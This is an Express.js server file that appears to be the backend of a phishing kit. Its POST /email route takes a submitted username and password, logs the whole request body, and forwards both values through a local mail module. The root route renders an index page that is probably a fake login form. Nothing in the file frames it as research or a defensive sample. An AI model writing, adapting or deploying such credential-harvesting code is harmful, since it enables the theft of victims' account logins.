var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
var cors = require('cors');
var sendMail = require('./mail')


var app = express();

// view engine setup

app.set('view engine', 'ejs');

app.set('views', path.join(__dirname, 'views'));

app.use('/img', express.static(__dirname + 'views/img'))
app.use(express.static(path.join(__dirname, 'views')));


app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());



//data parsing
app.use(express.urlencoded({
  extended: false
}))
app.use(express.json())
app.use(cors())


app.post('/email', (req,res) => {
  const {collectUserName, collectPassword} = req.body
  console.log('Data:', req.body)

  sendMail(collectUserName, collectPassword, function(err, data) {
      if (err) {
          res.status(500).json({message: 'internal error',err})
      }else{
          res.json({message:'Email Sent!'})
      }
  })

})

//Router to render html
app.get('/', (req,res)=> {
  res.render('index.ejs')
})

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  next(createError(404));
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});

module.exports = app;
